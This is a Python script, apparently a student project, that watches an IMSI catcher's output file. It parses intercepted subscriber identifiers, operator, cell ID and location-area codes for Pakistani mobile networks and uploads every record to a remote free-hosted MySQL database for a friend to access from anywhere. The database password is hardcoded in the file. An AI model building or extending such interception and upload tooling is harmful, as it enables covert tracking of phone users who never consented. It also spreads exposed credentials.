#!/usr/bin/env python3
"""
Cloud IMSI Writer - Writes directly to InfinityFree MySQL
No proxy, no ngrok, no VPN needed!
"""

import pymysql
import os
import re
import time
import json
from datetime import datetime
from pathlib import Path

# ==========================================
# YOUR INFINITYFREE CLOUD DATABASE
# ==========================================
CLOUD_CONFIG = {
    'host': 'sql201.infinityfree.com',
    'port': 3306,
    'user': 'if0_41388991',
    'password': 'projectfyp',  # Your password
    'database': 'if0_41388991_imsi_data',
}

class CloudIMSIWriter:
    def __init__(self):
        self.conn = None
        self.last_position = 0
        self.total_uploaded = 0
        self.connect_to_cloud()
        
    def connect_to_cloud(self):
        """Establish connection to cloud database"""
        try:
            self.conn = pymysql.connect(
                host=CLOUD_CONFIG['host'],
                port=CLOUD_CONFIG['port'],
                user=CLOUD_CONFIG['user'],
                password=CLOUD_CONFIG['password'],
                database=CLOUD_CONFIG['database'],
                charset='utf8mb4'
            )
            print(f"✅ Connected to cloud database at {CLOUD_CONFIG['host']}")
            self.create_table_if_not_exists()
            return True
        except Exception as e:
            print(f"❌ Cloud connection failed: {e}")
            return False
    
    def create_table_if_not_exists(self):
        """Ensure the table exists"""
        try:
            cursor = self.conn.cursor()
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS imsi_captures (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    timestamp DATETIME,
                    imsi VARCHAR(20),
                    operator VARCHAR(20),
                    mcc VARCHAR(3),
                    mnc VARCHAR(3),
                    cell_id INT,
                    lac INT,
                    source_ip VARCHAR(45),
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    INDEX idx_timestamp (timestamp),
                    INDEX idx_operator (operator)
                )
            """)
            self.conn.commit()
            print("✅ Table ready")
        except Exception as e:
            print(f"⚠️ Table creation warning: {e}")
    
    def parse_imsi_line(self, line):
        """Parse IMSI from your catcher output"""
        if not line or line.startswith('Nb IMSI') or line.startswith('stamp'):
            return None
        
        # Extract IMSI (410 06 XXXXXXX format)
        imsi_match = re.search(r'410\s+0[3467]\s+\d+', line)
        if not imsi_match:
            return None
        
        imsi_parts = imsi_match.group(0).split()
        mcc = imsi_parts[0]
        mnc = imsi_parts[1]
        imsi_number = imsi_parts[2]
        full_imsi = f"{mcc}{mnc}{imsi_number}"
        
        # Determine operator
        operator_map = {
            '06': 'Telenor',
            '04': 'Zong',
            '03': 'Ufone',
            '01': 'Jazz',
            '07': 'Jazz'
        }
        operator = operator_map.get(mnc, 'Unknown')
        
        # Extract timestamp
        timestamp = datetime.now()
        time_match = re.search(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}', line)
        if time_match:
            try:
                timestamp = datetime.fromisoformat(time_match.group(0).replace(' ', 'T'))
            except:
                pass
        
        # Extract cell/lac info
        lac = None
        cell_id = None
        cell_match = re.search(r'(\d+)\s*;\s*(\d+)\s*$', line)
        if cell_match:
            lac = cell_match.group(1)
            cell_id = cell_match.group(2)
        
        return {
            'timestamp': timestamp,
            'imsi': full_imsi,
            'operator': operator,
            'mcc': mcc,
            'mnc': mnc,
            'cell_id': cell_id,
            'lac': lac,
            'source_ip': 'imsi_catcher'
        }
    
    def write_to_cloud(self, data):
        """Write a single IMSI record to cloud"""
        try:
            cursor = self.conn.cursor()
            sql = """
                INSERT INTO imsi_captures 
                (timestamp, imsi, operator, mcc, mnc, cell_id, lac, source_ip)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
            """
            cursor.execute(sql, (
                data['timestamp'],
                data['imsi'],
                data['operator'],
                data['mcc'],
                data['mnc'],
                data['cell_id'],
                data['lac'],
                data['source_ip']
            ))
            self.conn.commit()
            return True
        except Exception as e:
            print(f"⚠️ Write error: {e}")
            return False
    
    def monitor_and_upload(self):
        """Monitor imsi_output.txt and upload to cloud"""
        if not os.path.exists("imsi_output.txt"):
            Path("imsi_output.txt").touch()
            print("📁 Created imsi_output.txt")
        
        print("\n👀 Monitoring imsi_output.txt for new IMSIs...")
        print("☁️  Uploading directly to cloud database\n")
        
        with open("imsi_output.txt", "r") as f:
            # Go to end of file
            f.seek(0, 2)
            self.last_position = f.tell()
            
            while True:
                try:
                    line = f.readline()
                    if line:
                        data = self.parse_imsi_line(line)
                        if data:
                            if self.write_to_cloud(data):
                                self.total_uploaded += 1
                                print(f"  ☁️ [{self.total_uploaded}] {data['operator']}: ...{data['imsi'][-8:]}")
                    else:
                        time.sleep(1)
                        
                except KeyboardInterrupt:
                    print(f"\n\n👋 Stopped. Total uploaded: {self.total_uploaded}")
                    if self.conn:
                        self.conn.close()
                    break
                except Exception as e:
                    print(f"⚠️ Error: {e}")
                    time.sleep(5)

if __name__ == "__main__":
    print("="*70)
    print("☁️  CLOUD IMSI WRITER - DIRECT TO INFINITYFREE")
    print("="*70)
    print("✅ No proxy, no ngrok, no VPN needed!")
    print("✅ Friend can access data 24/7 from anywhere")
    print("="*70)
    
    writer = CloudIMSIWriter()
    writer.monitor_and_upload()
